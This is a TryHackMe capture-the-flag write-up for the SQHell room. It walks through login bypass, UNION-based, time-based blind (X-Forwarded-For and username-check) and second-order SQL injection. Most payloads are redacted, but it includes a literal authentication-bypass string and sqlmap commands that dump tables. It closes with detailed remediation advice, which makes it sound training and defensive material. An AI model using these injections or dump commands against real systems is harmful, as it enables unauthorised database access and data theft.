# SQHell Challenge

![Banner](./../IMAGES/sqhell_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *[TryHackMe Challenges](https://tryhackme.com/challenges)* | **Challenge:** *[SQHell](https://tryhackme.com/room/sqhell)*  

> [!IMPORTANT]
>
> **Working writeup notice:** This was a working and verified writeup at the time of writing on **25 July 2026**.
>
> **Spoiler warning:** This writeup documents the exploitation chain, although exact challenge-specific payloads, database names, extracted values and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents exact payloads, database names, extracted values or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

SQHell is a web application security challenge focused on identifying and exploiting several forms of SQL injection.

The objective was to recover five flags from different application functions. Each vulnerable endpoint required a slightly different approach, including authentication bypass, UNION-based extraction, time-based blind injection, HTTP header injection and nested SQL injection.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating SSH and HTTP services.
3. Discovering the `/login`, `/post`, `/register`, `/register/user-check`, `/user` and `/terms-and-conditions` routes.
4. Bypassing the login form and recovering Flag 1.
5. Exploiting the `/post` identifier with a UNION query and recovering Flag 5.
6. Following the IP logging clue and exploiting the `X-Forwarded-For` header to recover Flag 2.
7. Exploiting the registration username availability checker to recover Flag 3.
8. Chaining a nested SQL injection through the user profile function to recover Flag 4.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: sqhell.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> sqhell.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts sqhell.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/sqhell\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` and `ping` for validating local hostname resolution and connectivity.
- RustScan and Nmap for TCP port, service and script enumeration.
- WhatWeb for identifying web technologies.
- Dirsearch, Gobuster, Feroxbuster and FFUF for web content discovery.
- Firefox for interacting with the web application.
- cURL for manually testing SQL injection behaviour.
- SQLMap for confirming and extracting data through blind SQL injection.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Connectivity and Hostname Resolution

The hostname mapping and VPN route were checked before interacting with the application:

```bash
getent hosts sqhell.thm
ip route get <TARGET_IP>
ip -br address show tun0
ping -c 4 sqhell.thm
```

The output confirmed that:

```text
sqhell.thm -> <TARGET_IP>
Route interface -> tun0
Source address -> <TUN0_IP>
```

This ruled out local DNS and VPN routing problems before web enumeration began.

### Port and Service Discovery

A rapid RustScan scan was performed:

```bash
rustscan -a sqhell.thm --ulimit 5000 -- -sC -sV -Pn
```

Nmap was then used to verify the results:

```bash
nmap -p22,80 -sV -sC -Pn -T4 sqhell.thm
```

The principal findings were:

```text
22/tcp open  ssh
80/tcp open  http
```

Service detection identified:

```text
SSH:  OpenSSH on Ubuntu
HTTP: nginx on Ubuntu
```

SSH was not immediately useful because no credentials had been recovered. The investigation therefore focused on the HTTP service.

### Web Technology Identification

WhatWeb identified a Bootstrap and jQuery-based application served by Nginx:

```bash
whatweb sqhell.thm/
```

The result included:

```text
Bootstrap
jQuery
nginx
Ubuntu Linux
```

### Web Content Discovery

Several content-discovery tools were used to cross-check the available routes:

```bash
dirsearch -u sqhell.thm/
```

```bash
gobuster dir \
  -u http://sqhell.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

```bash
feroxbuster \
  -u http://sqhell.thm/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,py \
  -t 50 \
  -k \
  -C 404 \
  --redirects
```

```bash
ffuf \
  -u 'http://sqhell.thm/FUZZ' \
  -w /usr/share/wordlists/dirb/big.txt \
  -mc all \
  -fc 404
```

The important routes were:

```text
/login
/post
/register
/register/user-check
/user
/terms-and-conditions
```

Direct requests to `/post` and `/user` returned:

```text
Missing parameter: id
```

The registration page revealed a client-side request to:

```text
/register/user-check?username=
```

The Terms and Conditions page contained the important clue:

```text
We log your IP address for analytics purposes
```

## Exploits

The flags were not discovered in numerical order; they were recovered according to the sequence in which each vulnerable endpoint was identified and successfully exploited.

### Flag 1 - SQL Injection Authentication Bypass

The first flag was found through the `/login` page.

The login form accepted a conventional SQL injection authentication bypass in the username field. The exact values are intentionally redacted:

```text
Username: admin’ or ‘1’=’1’
Password: BLANK
```

The injected username terminated the original string, introduced a condition that evaluated as true and commented out the remainder of the password comparison.

Check out [Injection Attacks](https://tryhackme.com/module/injection-attacks) if you need a reminder.

This should return a successful authentication followed with a login (kinda):

```text
THM{....}
```

This confirmed that the application was constructing the login query with unsanitised user input rather than using a prepared statement.

### Flag 5 - UNION-Based SQL Injection in the Post Viewer

The second flag found during the assessment was Flag 5.

The `/post` route required an `id` parameter:

```text
/post?id=<VALUE>
```

A UNION-based test established that the underlying query returned four columns and that the third column appeared in the visible post body:

```bash
curl -sG 'http://sqhell.thm/post' \
  --data-urlencode 'id=<REDACTED>'
```

The response displayed the database user:

```text
<REDACTED>@localhost
```

This confirmed three important details:

- The `id` parameter was injectable.
- The query accepted four UNION columns.
- The third selected column was rendered in the response.

The visible column was then used to select the flag value from the local `flag` table:

```bash
curl -sG 'http://sqhell.thm/post' \
  --data-urlencode 'id=<REDACTED>'
```

The response returned:

```text
THM{....}
```

Using a non-existent original record prevented a normal post from obscuring the injected UNION result.

### Flag 2 - Time-Based Blind Injection in X-Forwarded-For

The third flag found was Flag 2.

The Terms and Conditions page stated that visitor IP addresses were logged for analytics. This suggested that a client address header might be inserted into a database query.

The `X-Forwarded-For` header was tested with SQLMap:

```bash
sqlmap \
  -u 'http://sqhell.thm/' \
  --headers='X-Forwarded-For: <REDACTED>*' \
  --dbms=mysql \
  -D <REDACTED> \
  -T flag \
  --dump \
  --batch
```

SQLMap identified the custom header as vulnerable:

```text
Parameter: X-Forwarded-For
Type: time-based blind
Back-end DBMS: MySQL
```

The target did not directly print the queried value. SQLMap instead used conditional database delays and measured the response time to infer the data one character at a time.

The extracted record was:

```text
THM{....}
```

### Flag 3 - Registration Username Availability Check

The fourth flag found was Flag 3.

The registration page performed an asynchronous username availability check:

```text
/register/user-check?username=<VALUE>
```

The endpoint was tested with SQLMap:

```bash
sqlmap \
  -u 'http://sqhell.thm/register/user-check?username=<REDACTED>' \
  -p username \
  --dbms=mysql \
  -D <REDACTED> \
  -T flag \
  --dump \
  --batch
```

SQLMap confirmed another time-based blind injection:

```text
Parameter: username
Type: time-based blind
Back-end DBMS: MySQL
```

The endpoint returned JSON indicating whether a username was available, but did not directly expose arbitrary query results. SQLMap again relied on conditional delays to recover the table contents.

The extracted record was:

```text
THM{....}
```

### Flag 4 - Nested SQL Injection in the User Profile

The final flag found was Flag 4.

The `/user` endpoint accepted an `id` parameter:

```text
/user?id=<VALUE>
```

A preliminary UNION test showed that the outer user query returned three columns:

```bash
curl -sG 'http://sqhell.thm/user' \
  --data-urlencode 'id=<REDACTED>'
```

The response displayed attacker-controlled values in the user details:

```text
User ID: <REDACTED>
Username: <REDACTED>
```

This confirmed that the result of the injected outer query was being processed by the application.

The application then reused one of those returned values in a second database query used to retrieve the user's posts. A second SQL injection statement was therefore embedded inside the data returned by the first query.

The final nested request is intentionally redacted:

```bash
curl -sG 'http://sqhell.thm/user' \
  --data-urlencode 'id=<REDACTED>'
```

The inner query selected the flag value from the `flag` table. The result appeared as an additional post title in the user's post list:

```text
THM{....}
```

This was a nested, or second-order, SQL injection because attacker-controlled data produced by one SQL query was later interpreted as part of another SQL statement.

### Decoding and Data Transformation

No Base64, hexadecimal, URL-safe token, cipher text or custom encoding had to be manually decoded during this challenge.

cURL's `--data-urlencode` option was used to encode SQL injection strings safely into query parameters:

```bash
curl -sG 'http://sqhell.thm/<REDACTED>' \
  --data-urlencode '<PARAMETER>=<REDACTED>'
```

This prevented spaces, comment characters, quotation marks and other reserved URL characters from being interpreted incorrectly by the shell or HTTP client.

SQLMap performed its own request encoding and timing analysis during blind extraction. No recovered value required additional decoding after extraction.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The allocated target and `tun0` addresses were confirmed. The hostname `sqhell.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the application was accessed through its expected local hostname.

### 2. Service Discovery
RustScan and Nmap identified SSH on port 22 and HTTP on port 80. The web application was served by Nginx on Ubuntu.

### 3. Web Technology and Route Enumeration
WhatWeb identified Bootstrap and jQuery. Directory enumeration discovered `/login`, `/post`, `/register` and `/user`, while recursive discovery also identified `/terms-and-conditions` and `/register/user-check`.

### 4. Login Authentication Bypass
The `/login` form was vulnerable to SQL injection in the username field. A true condition was introduced and the remaining password comparison was commented out.

Successful authentication exposed the first recovered flag:

```text
THM{....}
```

### 5. Post Query Column Discovery
The `/post` endpoint accepted an injectable `id` value. A UNION test established that the original query returned four columns and that the third column appeared in the post body.

### 6. UNION-Based Flag Extraction
The third visible column was replaced with the `flag` field from the local flag table. This returned the second flag found during the assessment, which was challenge Flag 5:

```text
THM{....}
```

### 7. IP Logging Clue
The Terms and Conditions page stated that visitor IP addresses were logged. This pointed towards a forwarding header being processed by the application.

### 8. X-Forwarded-For Injection
SQLMap tested a custom injection marker inside `X-Forwarded-For`. The header was confirmed as vulnerable to MySQL time-based blind SQL injection.

### 9. Blind Extraction of Flag 2
Conditional database delays were used to infer the contents of the relevant flag table. The third flag found during the assessment was challenge Flag 2:

```text
THM{....}
```

### 10. Registration Endpoint Analysis
The registration form's JavaScript revealed `/register/user-check`, which accepted a `username` query parameter and returned a JSON availability response.

### 11. Blind Extraction of Flag 3
SQLMap confirmed the username parameter as time-based blind injectable and extracted the next flag. The fourth flag found during the assessment was challenge Flag 3:

```text
THM{....}
```

### 12. User Query Manipulation
The `/user` endpoint accepted a three-column UNION query. Controlled values appeared in the user profile, proving that the outer database result could be manipulated.

### 13. Nested SQL Injection
A second SQL injection was embedded within a value returned by the first query. The application reused that value while querying the user's posts, causing the inner SQL statement to execute.

### 14. Final Flag Recovery
The nested query inserted the flag value into the post list. The final flag found during the assessment was challenge Flag 4:

```text
THM{....}
```

## Key Lessons

SQHell demonstrated several useful penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali VM for TryHackMe rooms.
- Enumerate both visible application routes and client-side JavaScript requests.
- A disabled registration button does not mean that supporting registration endpoints are inactive.
- Authentication forms remain a common place to test for basic SQL injection.
- UNION testing should establish the column count and identify which columns are visible before attempting data extraction.
- An invalid original record identifier can make injected UNION results easier to observe.
- HTTP headers are user-controlled input unless trusted infrastructure explicitly rewrites and validates them.
- Application text and legal pages can contain genuine technical clues.
- Blind SQL injection can still disclose complete database records even when no query output is printed.
- Time-based extraction depends on stable response timing and may require patience.
- Data retrieved from a database must not automatically be treated as trusted.
- Second-order injection can occur when one query's result is inserted into another dynamically constructed query.
- SQLMap is effective for blind extraction, but manual testing remains important for understanding the vulnerable application logic.
- Public writeups should explain the methodology without publishing exact flags or unnecessary challenge giveaways.

The most important technical lesson was that every input boundary must be treated independently. The login form, numeric identifiers, registration checker and forwarding header all reached SQL logic through different paths, yet each became exploitable because the application failed to parameterise its queries consistently.

## Remediation Notes

### Authentication Query Security

- Replace string-built login queries with prepared statements.
- Bind the username and password as data rather than SQL syntax.
- Store passwords using a modern adaptive password hash such as Argon2id or bcrypt.
- Return a generic authentication failure message regardless of whether the username exists.
- Add rate limiting and monitoring to the login endpoint.
- Alert on quotation marks, SQL comments and repeated authentication anomalies.

### Post and User Identifier Handling

- Convert record identifiers to integers before they reach database logic.
- Reject identifiers containing whitespace, quotes, comments or other non-numeric characters.
- Use prepared statements even after type validation.
- Return `404 Not Found` for missing records rather than passing raw values into SQL.
- Avoid exposing database error details to the client.
- Apply object-level authorisation before returning user or post data.

### Registration Endpoint Security

- Remove the username availability endpoint if registration is disabled.
- Require appropriate anti-automation controls where the endpoint remains necessary.
- Parameterise the username lookup query.
- Normalise usernames before comparison.
- Apply length and character restrictions appropriate to the application's account policy.
- Avoid returning unnecessary detail that can support account enumeration.
- Monitor repeated high-volume availability checks.

### Proxy Header Security

- Treat `X-Forwarded-For` as untrusted unless the request came through a known reverse proxy.
- Remove client-supplied forwarding headers at the network edge.
- Configure the trusted proxy to insert a validated client address.
- Parameterise every analytics and logging query.
- Store IP addresses in a suitable typed field rather than concatenating them into SQL.
- Restrict which application components can write to analytics tables.
- Alert on SQL syntax, comments or abnormal lengths in forwarding headers.

### Blind SQL Injection Resistance

- Use parameterised queries for every database operation.
- Avoid relying on hidden output as a security measure.
- Apply database statement timeouts to limit deliberate sleep-based queries.
- Monitor repeated requests with regular delay patterns.
- Rate-limit endpoints that do not require high request volumes.
- Suppress detailed database errors from client responses.
- Use a web application firewall only as an additional control, not as a replacement for secure coding.

### Second-Order Injection Prevention

- Treat data retrieved from a database as untrusted when it is reused.
- Never concatenate stored values into a later SQL statement.
- Parameterise each query at the moment it is executed.
- Validate stored data against its expected type and format.
- Review workflows where one query result influences another query.
- Include second-order injection cases in application security testing.
- Avoid dynamic SQL unless there is a clear, reviewed and unavoidable requirement.

### Database Privilege Management

- Give the web application only the database permissions it requires.
- Use separate database accounts for authentication, content, registration and analytics where practical.
- Prevent public-facing features from querying unrelated databases and tables.
- Remove access to sensitive tables from low-risk application functions.
- Rotate database credentials after suspected compromise.
- Store database credentials in a dedicated secrets-management system.
- Log and review unusual cross-database access attempts.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after each room.
- Maintain separate working directories for scan output and extracted evidence.
- Record the target, hostname and `tun0` details at the beginning of each engagement.
- Validate each stage of an attack chain before moving to the next.
- Preserve relevant terminal output so findings can be reproduced accurately.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
